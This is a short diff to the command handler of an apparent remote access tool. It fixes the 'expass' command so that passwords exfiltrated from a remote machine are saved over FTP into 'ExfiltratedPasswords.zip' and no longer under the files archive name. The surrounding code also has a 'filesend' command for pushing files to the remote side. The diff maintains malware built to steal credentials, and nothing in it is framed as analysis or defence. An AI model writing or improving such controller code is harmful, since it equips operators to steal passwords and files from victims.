@@ -69,7 +69,7 @@ public class HandleCommand {
 			Shell.out.println("expass");
 			System.out.println("Receiving passwords to '" + System.getProperty("user.dir") + File.separator + "gathered"
 					+ File.separator + "ExfiltratedPasswords.zip'...");
-			FTP.shell("gathered" + File.separator + "ExfiltratedFiles.zip", "rec");
+			FTP.shell("gathered" + File.separator + "ExfiltratedPasswords.zip", "rec");
 			System.out.println(getResp());
 		} else if (command.equals("filesend")) {
 			System.out.println("Enter local filepath of file to send:");
